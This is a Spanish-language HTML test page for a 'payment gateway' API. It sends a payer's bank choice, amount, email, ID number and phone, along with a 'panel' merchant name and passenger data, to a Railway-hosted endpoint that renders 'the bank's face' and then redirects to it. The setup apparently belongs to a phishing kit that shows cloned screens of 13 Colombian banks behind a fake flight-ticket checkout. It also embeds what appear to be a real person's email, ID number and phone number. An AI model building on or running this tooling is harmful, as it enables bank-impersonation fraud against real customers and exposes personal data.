<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prueba de API - Pasarela Unificada</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f172a;
            color: #f1f5f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .card {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 600px;
        }
        h2 {
            margin-top: 0;
            color: #38bdf8;
            border-bottom: 2px solid #334155;
            padding-bottom: 10px;
        }
        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }
        @media (max-width: 500px) {
            .form-grid {
                grid-template-columns: 1fr;
            }
        }
        .form-group {
            display: flex;
            flex-direction: column;
        }
        .form-group.full-width {
            grid-column: span 2;
        }
        @media (max-width: 500px) {
            .form-group.full-width {
                grid-column: span 1;
            }
        }
        label {
            margin-bottom: 5px;
            font-weight: 600;
            font-size: 0.9rem;
            color: #94a3b8;
        }
        select, input {
            padding: 10px;
            background: #0f172a;
            border: 1px solid #475569;
            border-radius: 6px;
            color: #fff;
            font-size: 0.95rem;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }
        select:focus, input:focus {
            border-color: #38bdf8;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.2s, transform 0.1s;
        }
        button:hover {
            background-color: #0ea5e9;
        }
        button:active {
            transform: scale(0.98);
        }
        .status-container {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            background: #0f172a;
            font-family: monospace;
            font-size: 0.85rem;
            display: none;
            word-break: break-all;
        }
    </style>
</head>
<body>

<div class="card">
    <h2>Simulador de API Pasarela 🚀</h2>
    <p style="color: #94a3b8; font-size: 0.9rem; margin-bottom: 20px;">
        Personaliza todos los datos del payload JSON para probar la API y pintar la cara correspondiente del banco.
    </p>
    
    <div class="form-grid">
        <div class="form-group">
            <label for="apiUrl">Servidor API destino:</label>
            <select id="apiUrl">
                <option value="https://dsfsadfasf-si.up.railway.app">Railway Producción (dsfsadfasf-si)</option>
                <option value="http://localhost:8001">Localhost (Puerto 8001)</option>
            </select>
        </div>

        <div class="form-group">
            <label for="banco">Banco:</label>
            <select id="banco">
                <option value="BANCOLOMBIA">Bancolombia</option>
                <option value="NEQUI">Nequi</option>
                <option value="DAVIVIENDA">Davivienda</option>
                <option value="OCCIDENTE">Occidente</option>
                <option value="COLPATRIA">Colpatria</option>
                <option value="AVVILLAS">AV Villas</option>
                <option value="BBVA">BBVA</option>
                <option value="BOGOTA">Bogotá</option>
                <option value="CAJASOCIAL">Caja Social</option>
                <option value="FALABELLA">Falabella</option>
                <option value="ITAU">Itaú</option>
                <option value="POPULAR">Popular</option>
                <option value="SERFINANZA">Serfinanza</option>
            </select>
        </div>

        <div class="form-group">
            <label for="precio">Valor a pagar:</label>
            <input type="number" id="precio" value="360000" />
        </div>

        <div class="form-group">
            <label for="correoUsuario">Correo del Usuario:</label>
            <input type="email" id="correoUsuario" value="jesuscastano101@gmail.com" />
        </div>

        <div class="form-group">
            <label for="tipoDocumento">Tipo de Documento:</label>
            <select id="tipoDocumento">
                <option value="Cedula de Ciudadania">Cédula de Ciudadanía</option>
                <option value="Cedula de Extranjeria">Cédula de Extranjería</option>
                <option value="Pasaporte">Pasaporte</option>
                <option value="NIT">NIT</option>
            </select>
        </div>

        <div class="form-group">
            <label for="cedula">Número de Documento:</label>
            <input type="text" id="cedula" value="10457542538" />
        </div>

        <div class="form-group">
            <label for="celular">Celular:</label>
            <input type="text" id="celular" value="+57 3233763923" />
        </div>

        <div class="form-group">
            <label for="panel">Nombre del Comercio (Panel):</label>
            <input type="text" id="panel" value="TIQUETES BARATOS SA" />
        </div>

        <div class="form-group">
            <label for="pasajeroNombre">Nombre del Pasajero:</label>
            <input type="text" id="pasajeroNombre" value="julian palla" />
        </div>

        <div class="form-group">
            <label for="pasajeroDocumento">Documento del Pasajero:</label>
            <input type="text" id="pasajeroDocumento" value="10457542538" />
        </div>
    </div>

    <button onclick="enviarPrueba()">Enviar Simulación y Pintar Cara</button>
    
    <div id="status" class="status-container"></div>
</div>

<script>
    function showStatus(text, color = '#f1f5f9') {
        const container = document.getElementById('status');
        container.style.display = 'block';
        container.style.color = color;
        container.innerText = text;
    }

    async function enviarPrueba() {
        const serverBase = document.getElementById('apiUrl').value;
        const banco = document.getElementById('banco').value;
        const precio = parseInt(document.getElementById('precio').value);
        const correoUsuario = document.getElementById('correoUsuario').value;
        const tipoDocumento = document.getElementById('tipoDocumento').value;
        const cedula = document.getElementById('cedula').value;
        const celular = document.getElementById('celular').value;
        const panel = document.getElementById('panel').value;
        const pasajeroNombre = document.getElementById('pasajeroNombre').value;
        const pasajeroDocumento = document.getElementById('pasajeroDocumento').value;

        const sessionId = "session_prueba_" + Date.now();

        const payload = {
            "data": {
                "attributes": {
                    "banco": banco,
                    "precio": precio,
                    "tipoPersona": "Natural",
                    "correoUsuario": correoUsuario,
                    "ip": "1",
                    "lastStatus": "pendiente",
                    "location": "1",
                    "panel": panel,
                    "seccion": "Vuelos",
                    "cedula": cedula,
                    "tipoDocumento": tipoDocumento,
                    "celular": celular,
                    "sessionId": sessionId,
                    "tc": false,
                    "timeline": [
                        {
                            "type": "pasajero",
                            "timestamp": new Date().toISOString(),
                            "data": {
                                "documento": pasajeroDocumento,
                                "nombre": pasajeroNombre
                            }
                        }
                    ]
                }
            }
        };

        showStatus("Enviando petición a la API...");

        try {
            const response = await fetch(`${serverBase}/api/v1/sandbox/render-face`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();

            if (result.success) {
                showStatus("¡Éxito! Redirigiendo a la pantalla del banco...", "#4ade80");
                
                setTimeout(() => {
                    if (serverBase.includes('localhost')) {
                        // En desarrollo local el frontend de React corre en el puerto 3001. 
                        // Mapeamos el puerto 8001 de la respuesta del backend al puerto 3001 del frontend.
                        const localUrl = result.renderUrl.replace(':8001', ':3001');
                        window.location.href = localUrl;
                    } else {
                        // En producción en Railway, la URL de renderUrl ya apunta al dominio unificado de producción.
                        window.location.href = result.renderUrl;
                    }
                }, 1000);
            } else {
                showStatus("Error devuelto por la API: " + result.message, "#f87171");
            }

        } catch (error) {
            showStatus("Error de red al intentar conectar. ¿El servidor destino está encendido?", "#f87171");
            console.error(error);
        }
    }
</script>

</body>
</html>
